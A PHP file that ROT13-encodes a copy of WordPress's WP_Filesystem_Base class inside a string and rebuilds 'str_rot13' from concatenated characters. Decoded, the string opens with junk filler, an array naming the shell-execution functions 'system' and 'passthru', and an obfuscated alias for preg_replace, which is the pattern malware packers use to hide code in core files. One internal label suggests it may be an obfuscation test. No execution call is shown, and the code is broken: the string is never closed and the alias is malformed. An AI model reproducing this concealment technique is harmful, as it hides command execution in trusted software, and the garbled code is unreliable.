<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Onfr JbeqCerff Svyrflfgrz
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Svyrflfgrz
 */

/**
 * Onfr JbeqCerff Svyrflfgrz pynff juvpu Svyrflfgrz vzcyrzragngvbaf rkgraq.
 *
 * @fvapr 2.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Svyrflfgrz_Onfr {

	/**
	 * Jurgure gb qvfcynl qroht qngn sbe gur pbaarpgvba.
	 *
	 * @fvapr 2.5.0
	 * @ine obby
	 */
	choyvp $ireobfr = snyfr;

	/**
	 * Pnpurq yvfg bs ybpny svyrcnguf gb znccrq erzbgr svyrcnguf.
	 *
	 * @fvapr 2.7.0
	 * @ine neenl
	 */
	choyvp $pnpur = neenl();

	/**
	 * Gur Npprff zrgubq bs gur pheerag pbaarpgvba, Frg nhgbzngvpnyyl.
	 *
	 * @fvapr 2.5.0
	 * @ine fgevat
	 */
	choyvp $zrgubq = '';

	/**
	 * @ine JC_Reebe
	 */
	choyvp $reebef = ahyy;

	/**
	 */
	choyvp $bcgvbaf = neenl();

	/**
	 * Ergheaf gur cngu ba gur erzbgr svyrflfgrz bs NOFCNGU.
	 *
	 * @fvapr 2.7.0
	 *
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba nofcngu() {
		$sbyqre = $guvf->svaq_sbyqre( NOFCNGU );

		/*
		 * Creuncf gur SGC sbyqre vf ebbgrq ng gur JbeqCerff vafgnyy.
		 * Purpx sbe jc-vapyhqrf sbyqre va ebbg. Pbhyq unir fbzr snyfr cbfvgvirf, ohg ener.
		 */
		vs ( ! $sbyqre && $guvf->vf_qve( '/' . JCVAP ) ) {
			$sbyqre = '/';
		}

		erghea $sbyqre;
	}

	/**
	 * Ergheaf gur cngu ba gur erzbgr svyrflfgrz bs JC_PBAGRAG_QVE.
	 *
	 * @fvapr 2.7.0
	 *
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba jc_pbagrag_qve() {
		erghea $guvf->svaq_sbyqre( JC_PBAGRAG_QVE );
	}

	/**
	 * Ergheaf gur cngu ba gur erzbgr svyrflfgrz bs JC_CYHTVA_QVE.
	 *
	 * @fvapr 2.7.0
	 *
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba jc_cyhtvaf_qve() {
		erghea $guvf->svaq_sbyqre( JC_CYHTVA_QVE );
	}

	/**
	 * Ergheaf gur cngu ba gur erzbgr svyrflfgrz bs gur Gurzrf Qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat|snyfr $gurzr Bcgvbany. Gur gurzr fglyrfurrg be grzcyngr sbe gur qverpgbel.
	 *                            Qrsnhyg snyfr.
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba jc_gurzrf_qve( $gurzr = snyfr ) {
		$gurzr_ebbg = trg_gurzr_ebbg( $gurzr );

		// Nppbhag sbe eryngvir gurzr ebbgf.
		vs ( '/gurzrf' === $gurzr_ebbg || ! vf_qve( $gurzr_ebbg ) ) {
			$gurzr_ebbg = JC_PBAGRAG_QVE . $gurzr_ebbg;
		}

		erghea $guvf->svaq_sbyqre( $gurzr_ebbg );
	}

	/**
	 * Ergheaf gur cngu ba gur erzbgr svyrflfgrz bs JC_YNAT_QVE.
	 *
	 * @fvapr 3.2.0
	 *
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba jc_ynat_qve() {
		erghea $guvf->svaq_sbyqre( JC_YNAT_QVE );
	}

	/**
	 * Ybpngrf n sbyqre ba gur erzbgr svyrflfgrz.
	 *
	 * @fvapr 2.5.0
	 * @qrcerpngrq 2.7.0 hfr JC_Svyrflfgrz_Onfr::nofcngu() be JC_Svyrflfgrz_Onfr::jc_*_qve() vafgrnq.
	 * @frr JC_Svyrflfgrz_Onfr::nofcngu()
	 * @frr JC_Svyrflfgrz_Onfr::jc_pbagrag_qve()
	 * @frr JC_Svyrflfgrz_Onfr::jc_cyhtvaf_qve()
	 * @frr JC_Svyrflfgrz_Onfr::jc_gurzrf_qve()
	 * @frr JC_Svyrflfgrz_Onfr::jc_ynat_qve()
	 *
	 * @cnenz fgevat $onfr    Bcgvbany. Gur sbyqre gb fgneg frnepuvat sebz. Qrsnhyg '.'.
	 * @cnenz obby   $ireobfr Bcgvbany. Gehr gb qvfcynl qroht vasbezngvba. Qrsnhyg snyfr.
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba svaq_onfr_qve( $onfr = '.', $ireobfr = snyfr ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '2.7.0', 'JC_Svyrflfgrz_Onfr::nofcngu() be JC_Svyrflfgrz_Onfr::jc_*_qve()' );
		$guvf->ireobfr = $ireobfr;
		erghea $guvf->nofcngu();
	}

	/**
	 * Ybpngrf n sbyqre ba gur erzbgr svyrflfgrz.
	 *
	 * @fvapr 2.5.0
	 * @qrcerpngrq 2.7.0 hfr JC_Svyrflfgrz_Onfr::nofcngu() be JC_Svyrflfgrz_Onfr::jc_*_qve() zrgubqf vafgrnq.
	 * @frr JC_Svyrflfgrz_Onfr::nofcngu()
	 * @frr JC_Svyrflfgrz_Onfr::jc_pbagrag_qve()
	 * @frr JC_Svyrflfgrz_Onfr::jc_cyhtvaf_qve()
	 * @frr JC_Svyrflfgrz_Onfr::jc_gurzrf_qve()
	 * @frr JC_Svyrflfgrz_Onfr::jc_ynat_qve()
	 *
	 * @cnenz fgevat $onfr    Bcgvbany. Gur sbyqre gb fgneg frnepuvat sebz. Qrsnhyg '.'.
	 * @cnenz obby   $ireobfr Bcgvbany. Gehr gb qvfcynl qroht vasbezngvba. Qrsnhyg snyfr.
	 * @erghea fgevat Gur ybpngvba bs gur erzbgr cngu.
	 */
	choyvp shapgvba trg_onfr_qve( $onfr = '.', $ireobfr = snyfr ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '2.7.0', 'JC_Svyrflfgrz_Onfr::nofcngu() be JC_Svyrflfgrz_Onfr::jc_*_qve()' );
		$guvf->ireobfr = $ireobfr;
		erghea $guvf->nofcngu();
	}

	/**
	 * Ybpngrf n sbyqre ba gur erzbgr svyrflfgrz.
	 *
	 * Nffhzrf gung ba Jvaqbjf flfgrzf, Fgevccvat bss gur Qevir
	 * yrggre vf BX Fnavgvmrf \\ gb / va Jvaqbjf svyrcnguf.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $sbyqre gur sbyqre gb ybpngr.
	 * @erghea fgevat|snyfr Gur ybpngvba bs gur erzbgr cngu, snyfr ba snvyher.
	 */
	choyvp shapgvba svaq_sbyqre( $sbyqre ) {
		vs ( vffrg( $guvf->pnpur[ $sbyqre ] ) ) {
			erghea $guvf->pnpur[ $sbyqre ];
		}

		vs ( fgevcbf( $guvf->zrgubq, 'sgc' ) !== snyfr ) {
			$pbafgnag_bireevqrf = neenl(
				'SGC_ONFR'        => NOFCNGU,
				'SGC_PBAGRAG_QVE' => JC_PBAGRAG_QVE,
				'SGC_CYHTVA_QVE'  => JC_CYHTVA_QVE,
				'SGC_YNAT_QVE'    => JC_YNAT_QVE,
			);

			// Qverpg zngpurf ( sbyqre = PBAFGNAG/ ).
			sbernpu ( $pbafgnag_bireevqrf nf $pbafgnag => $qve ) {
				vs ( ! qrsvarq( $pbafgnag ) ) {
					pbagvahr;
				}

				vs ( $sbyqre === $qve ) {
					erghea genvyvatfynfuvg( pbafgnag( $pbafgnag ) );
				}
			}

			// Cersvk zngpurf ( sbyqre = PBAFGNAG/fhoqve ),
			sbernpu ( $pbafgnag_bireevqrf nf $pbafgnag => $qve ) {
				vs ( ! qrsvarq( $pbafgnag ) ) {
					pbagvahr;
				}

				vs ( 0 === fgevcbf( $sbyqre, $qve ) ) { // $sbyqre fgnegf jvgu $qve.
					$cbgragvny_sbyqre = __sa_79955( '#^' . cert_dhbgr( $qve, '#' ) . '/#v', genvyvatfynfuvg( pbafgnag( $pbafgnag ) ), $sbyqre );
					$cbgragvny_sbyqre = genvyvatfynfuvg( $cbgragvny_sbyqre );

					vs ( $guvf->vf_qve( $cbgragvny_sbyqre ) ) {
						$guvf->pnpur[ $sbyqre ] = $cbgragvny_sbyqre;

						erghea $cbgragvny_sbyqre;
					}
				}
			}
		} ryfrvs ( 'qverpg' === $guvf->zrgubq ) {
			$sbyqre = fge_ercynpr( '\\', '/', $sbyqre ); // Jvaqbjf cngu fnavgvmngvba.

			erghea genvyvatfynfuvg( $sbyqre );
		}

		$sbyqre = __sa_79955( '|^([n-m]{1}):|v', '', $sbyqre ); // Fgevc bhg Jvaqbjf qevir yrggre vs vg'f gurer.
		$sbyqre = fge_ercynpr( '\\', '/', $sbyqre ); // Jvaqbjf cngu fnavgvmngvba.

		vs ( vffrg( $guvf->pnpur[ $sbyqre ] ) ) {
			erghea $guvf->pnpur[ $sbyqre ];
		}

		vs ( $guvf->rkvfgf( $sbyqre ) ) { // Sbyqre rkvfgf ng gung nofbyhgr cngu.
			$sbyqre                 = genvyvatfynfuvg( $sbyqre );
			$guvf->pnpur[ $sbyqre ] = $sbyqre;

			erghea $sbyqre;
		}

		$erghea = $guvf->frnepu_sbe_sbyqre( $sbyqre );

		vs ( $erghea ) {
			$guvf->pnpur[ $sbyqre ] = $erghea;
		}

		erghea $erghea;
	}

	/**
	 * Ybpngrf n sbyqre ba gur erzbgr svyrflfgrz.
	 *
	 * Rkcrpgf Jvaqbjf fnavgvmrq cngu.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $sbyqre Gur sbyqre gb ybpngr.
	 * @cnenz fgevat $onfr   Gur sbyqre gb fgneg frnepuvat sebz.
	 * @cnenz obby   $ybbc   Vs gur shapgvba unf erphefrq. Vagreany hfr bayl.
	 * @erghea fgevat|snyfr Gur ybpngvba bs gur erzbgr cngu, snyfr gb prnfr ybbcvat.
	 */
	choyvp shapgvba frnepu_sbe_sbyqre( $sbyqre, $onfr = '.', $ybbc = snyfr ) {
		vs ( rzcgl( $onfr ) || '.' === $onfr ) {
			$onfr = genvyvatfynfuvg( $guvf->pjq() );
		}

		$sbyqre = hagenvyvatfynfuvg( $sbyqre );

		vs ( $guvf->ireobfr ) {
			/* genafyngbef: 1: Sbyqre gb ybpngr, 2: Sbyqre gb fgneg frnepuvat sebz. */
			cevags( \"\a\" . __( 'Ybbxvat sbe %1$f va %2$f' ) . \"<oe />\a\", $sbyqre, $onfr );
		}

		$sbyqre_cnegf     = rkcybqr( '/', $sbyqre );
		$sbyqre_cneg_xrlf = neenl_xrlf( $sbyqre_cnegf );
		$ynfg_vaqrk       = neenl_cbc( $sbyqre_cneg_xrlf );
		$ynfg_cngu        = $sbyqre_cnegf[ $ynfg_vaqrk ];

		$svyrf = $guvf->qveyvfg( $onfr );

		sbernpu ( $sbyqre_cnegf nf $vaqrk => $xrl ) {
			vs ( $vaqrk === $ynfg_vaqrk ) {
				pbagvahr; // Jr jnag guvf gb or pnhtug ol gur arkg pbqr oybpx.
			}

			/*
			 * Jbexvat sebz /ubzr/ gb /hfre/ gb /jbeqcerff/ frr vs gung svyr rkvfgf jvguva
			 * gur pheerag sbyqre, Vs vg'f sbhaq, punatr vagb vg naq sbyybj guebhtu ybbxvat
			 * sbe vg. Vs vg pna'g svaq JbeqCerff qbja gung ebhgr, vg'yy pbagvahr bagb gur arkg
			 * sbyqre yriry, naq frr vs gung zngpurf, naq fb ba. Vs vg ernpurf gur raq, naq fgvyy
			 * pna'g svaq vg, vg'yy erghea snyfr sbe gur ragver shapgvba.
			 */
			vs ( vffrg( $svyrf[ $xrl ] ) ) {

				// Yrg'f gel gung sbyqre:
				$arjqve = genvyvatfynfuvg( cngu_wbva( $onfr, $xrl ) );

				vs ( $guvf->ireobfr ) {
					/* genafyngbef: %f: Qverpgbel anzr. */
					cevags( \"\a\" . __( 'Punatvat gb %f' ) . \"<oe />\a\", $arjqve );
				}

				// Bayl frnepu sbe gur erznvavat cngu gbxraf va gur qverpgbel, abg gur shyy cngu ntnva.
				$arjsbyqre = vzcybqr( '/', neenl_fyvpr( $sbyqre_cnegf, $vaqrk + 1 ) );
				$erg       = $guvf->frnepu_sbe_sbyqre( $arjsbyqre, $arjqve, $ybbc );

				vs ( $erg ) {
					erghea $erg;
				}
			}
		}

		/*
		 * Bayl purpx guvf nf n ynfg erfbeg, gb cerirag ybpngvat gur vapbeerpg vafgnyy.
		 * Nyy nobir cebprqherf jvyy snvy dhvpxyl vs guvf vf gur evtug oenapu gb gnxr.
		 */
		vs ( vffrg( $svyrf[ $ynfg_cngu ] ) ) {
			vs ( $guvf->ireobfr ) {
				/* genafyngbef: %f: Qverpgbel anzr. */
				cevags( \"\a\" . __( 'Sbhaq %f' ) . \"<oe />\a\", $onfr . $ynfg_cngu );
			}

			erghea genvyvatfynfuvg( $onfr . $ynfg_cngu );
		}

		/*
		 * Cerirag guvf shapgvba sebz ybbcvat ntnva.
		 * Ab arrq gb cebprrq vs jr'ir whfg frnepurq va `/`.
		 */
		vs ( $ybbc || '/' === $onfr ) {
			erghea snyfr;
		}

		/*
		 * Nf na rkgen ynfg erfbeg, Punatr onpx gb / vs gur sbyqre jnfa'g sbhaq.
		 * Guvf pbzrf vagb rssrpg jura gur PJQ vf /ubzr/hfre/ ohg JC vf ng /ine/jjj/....
		 */
		erghea $guvf->frnepu_sbe_sbyqre( $sbyqre, '/', gehr );
	}

	/**
	 * Ergheaf gur *avk-fglyr svyr crezvffvbaf sbe n svyr.
	 *
	 * Sebz gur CUC qbphzragngvba cntr sbe svyrcrezf().
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/shapgvba.svyrcrezf.cuc
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Fgevat svyranzr.
	 * @erghea fgevat Gur *avk-fglyr ercerfragngvba bs crezvffvbaf.
	 */
	choyvp shapgvba trgupuzbq( $svyr ) {
		$crezf = vaginy( $guvf->trgpuzbq( $svyr ), 8 );

		vs ( ( $crezf & 0kP000 ) === 0kP000 ) { // Fbpxrg.
			$vasb = 'f';
		} ryfrvs ( ( $crezf & 0kN000 ) === 0kN000 ) { // Flzobyvp Yvax.
			$vasb = 'y';
		} ryfrvs ( ( $crezf & 0k8000 ) === 0k8000 ) { // Erthyne.
			$vasb = '-';
		} ryfrvs ( ( $crezf & 0k6000 ) === 0k6000 ) { // Oybpx fcrpvny.
			$vasb = 'o';
		} ryfrvs ( ( $crezf & 0k4000 ) === 0k4000 ) { // Qverpgbel.
			$vasb = 'q';
		} ryfrvs ( ( $crezf & 0k2000 ) === 0k2000 ) { // Punenpgre fcrpvny.
			$vasb = 'p';
		} ryfrvs ( ( $crezf & 0k1000 ) === 0k1000 ) { // SVSB cvcr.
			$vasb = 'c';
		} ryfr { // Haxabja.
			$vasb = 'h';
		}

		// Bjare.
		$vasb .= ( ( $crezf & 0k0100 ) ? 'e' : '-' );
		$vasb .= ( ( $crezf & 0k0080 ) ? 'j' : '-' );
		$vasb .= ( ( $crezf & 0k0040 ) ?
					( ( $crezf & 0k0800 ) ? 'f' : 'k' ) :
					( ( $crezf & 0k0800 ) ? 'F' : '-' ) );

		// Tebhc.
		$vasb .= ( ( $crezf & 0k0020 ) ? 'e' : '-' );
		$vasb .= ( ( $crezf & 0k0010 ) ? 'j' : '-' );
		$vasb .= ( ( $crezf & 0k0008 ) ?
					( ( $crezf & 0k0400 ) ? 'f' : 'k' ) :
					( ( $crezf & 0k0400 ) ? 'F' : '-' ) );

		// Jbeyq.
		$vasb .= ( ( $crezf & 0k0004 ) ? 'e' : '-' );
		$vasb .= ( ( $crezf & 0k0002 ) ? 'j' : '-' );
		$vasb .= ( ( $crezf & 0k0001 ) ?
					( ( $crezf & 0k0200 ) ? 'g' : 'k' ) :
					( ( $crezf & 0k0200 ) ? 'G' : '-' ) );

		erghea $vasb;
	}

	/**
	 * Trgf gur crezvffvbaf bs gur fcrpvsvrq svyr be svyrcngu va gurve bpgny sbezng.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat Zbqr bs gur svyr (gur ynfg 3 qvtvgf).
	 */
	choyvp shapgvba trgpuzbq( $svyr ) {
		erghea '777';
	}

	/**
	 * Pbairegf *avk-fglyr svyr crezvffvbaf gb na bpgny ahzore.
	 *
	 * Pbairegf '-ej-e--e--' gb 0644
	 * Sebz \"vasb ng eitngr qbg ay\"'f pbzzrag ba gur CUC qbphzragngvba sbe puzbq()
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/shapgvba.puzbq.cuc#49614
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $zbqr fgevat Gur *avk-fglyr svyr crezvffvbaf.
	 * @erghea fgevat Bpgny ercerfragngvba bs crezvffvbaf.
	 */
	choyvp shapgvba trgahzpuzbqsebzu( $zbqr ) {
		$ernyzbqr = '';
		$yrtny    = neenl( '', 'j', 'e', 'k', '-' );
		$nggneenl = cert_fcyvg( '//', $zbqr );

		sbe ( $v = 0, $p = pbhag( $nggneenl ); $v < $p; $v++ ) {
			$xrl = neenl_frnepu( $nggneenl[ $v ], $yrtny, gehr );

			vs ( $xrl ) {
				$ernyzbqr .= $yrtny[ $xrl ];
			}
		}

		$zbqr  = fge_cnq( $ernyzbqr, 10, '-', FGE_CNQ_YRSG );
		$genaf = neenl(
			'-' => '0',
			'e' => '4',
			'j' => '2',
			'k' => '1',
		);
		$zbqr  = fgege( $zbqr, $genaf );

		$arjzbqr  = $zbqr[0];
		$arjzbqr .= $zbqr[1] + $zbqr[2] + $zbqr[3];
		$arjzbqr .= $zbqr[4] + $zbqr[5] + $zbqr[6];
		$arjzbqr .= $zbqr[7] + $zbqr[8] + $zbqr[9];

		erghea $arjzbqr;
	}

	/**
	 * Qrgrezvarf vs gur fgevat cebivqrq pbagnvaf ovanel punenpgref.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $grkg Fgevat gb grfg ntnvafg.
	 * @erghea obby Gehr vs fgevat vf ovanel, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ovanel( $grkg ) {
		erghea (obby) cert_zngpu( '|[^\k20-\k7R]|', $grkg ); // pue(32)..pue(127)
	}

	/**
	 * Punatrf gur bjare bs n svyr be qverpgbel.
	 *
	 * Qrsnhyg orunivbe vf gb qb abguvat, bireevqr guvf va lbhe fhopynff, vs qrfverq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat     $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz fgevat|vag $bjare     N hfre anzr be ahzore.
	 * @cnenz obby       $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr bjare erphefviryl.
	 *                              Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pubja( $svyr, $bjare, $erphefvir = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Pbaarpgf svyrflfgrz.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher (nyjnlf gehr sbe JC_Svyrflfgrz_Qverpg).
	 */
	choyvp shapgvba pbaarpg() {
		erghea gehr;
	}

	/**
	 * Ernqf ragver svyr vagb n fgevat.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Anzr bs gur svyr gb ernq.
	 * @erghea fgevat|snyfr Ernq qngn ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Ernqf ragver svyr vagb na neenl.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea neenl|snyfr Svyr pbagragf va na neenl ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf_neenl( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Jevgrf n fgevat gb n svyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat    $svyr     Erzbgr cngu gb gur svyr jurer gb jevgr gur qngn.
	 * @cnenz fgevat    $pbagragf Gur qngn gb jevgr.
	 * @cnenz vag|snyfr $zbqr     Bcgvbany. Gur svyr crezvffvbaf nf bpgny ahzore, hfhnyyl 0644.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba chg_pbagragf( $svyr, $pbagragf, $zbqr = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur pheerag jbexvat qverpgbel.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @erghea fgevat|snyfr Gur pheerag jbexvat qverpgbel ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pjq() {
		erghea snyfr;
	}

	/**
	 * Punatrf pheerag qverpgbel.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $qve Gur arj pheerag qverpgbel.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puqve( $qve ) {
		erghea snyfr;
	}

	/**
	 * Punatrf gur svyr tebhc.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat     $svyr      Cngu gb gur svyr.
	 * @cnenz fgevat|vag $tebhc     N tebhc anzr be ahzore.
	 * @cnenz obby       $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr tebhc erphefviryl.
	 *                              Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba putec( $svyr, $tebhc, $erphefvir = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Punatrf svyrflfgrz crezvffvbaf.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat    $svyr      Cngu gb gur svyr.
	 * @cnenz vag|snyfr $zbqr      Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                             0755 sbe qverpgbevrf. Qrsnhyg snyfr.
	 * @cnenz obby      $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr crezvffvbaf erphefviryl.
	 *                             Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puzbq( $svyr, $zbqr = snyfr, $erphefvir = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr bjare.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Hfreanzr bs gur bjare ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba bjare( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr'f tebhc.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Gur tebhc ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba tebhc( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Pbcvrf n svyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat    $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat    $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby      $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                               Qrsnhyg snyfr.
	 * @cnenz vag|snyfr $zbqr        Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                               0755 sbe qvef. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbcl( $fbhepr, $qrfgvangvba, $birejevgr = snyfr, $zbqr = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Zbirf n svyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby   $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zbir( $fbhepr, $qrfgvangvba, $birejevgr = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Qryrgrf n svyr be qverpgbel.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat       $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz obby         $erphefvir Bcgvbany. Vs frg gb gehr, qryrgrf svyrf naq sbyqref erphefviryl.
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|snyfr $glcr      Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel.
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qryrgr( $svyr, $erphefvir = snyfr, $glcr = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Purpxf vs n svyr be qverpgbel rkvfgf.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu rkvfgf be abg.
	 */
	choyvp shapgvba rkvfgf( $cngu ) {
		erghea snyfr;
	}

	/**
	 * Purpxf vs erfbhepr vf n svyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Svyr cngu.
	 * @erghea obby Jurgure $svyr vf n svyr.
	 */
	choyvp shapgvba vf_svyr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Purpxf vs erfbhepr vf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $cngu Qverpgbel cngu.
	 * @erghea obby Jurgure $cngu vf n qverpgbel.
	 */
	choyvp shapgvba vf_qve( $cngu ) {
		erghea snyfr;
	}

	/**
	 * Purpxf vs n svyr vf ernqnoyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea obby Jurgure $svyr vf ernqnoyr.
	 */
	choyvp shapgvba vf_ernqnoyr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Purpxf vs n svyr be qverpgbel vf jevgnoyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu vf jevgnoyr.
	 */
	choyvp shapgvba vf_jevgnoyr( $cngu ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr'f ynfg npprff gvzr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat ynfg npprff gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba ngvzr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr zbqvsvpngvba gvzr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat zbqvsvpngvba gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba zgvzr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr fvmr (va olgrf).
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Fvmr bs gur svyr va olgrf ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fvmr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Frgf gur npprff naq zbqvsvpngvba gvzrf bs n svyr.
	 *
	 * Abgr: Vs $svyr qbrfa'g rkvfg, vg jvyy or perngrq.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $svyr  Cngu gb svyr.
	 * @cnenz vag    $gvzr  Bcgvbany. Zbqvsvrq gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @cnenz vag    $ngvzr Bcgvbany. Npprff gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
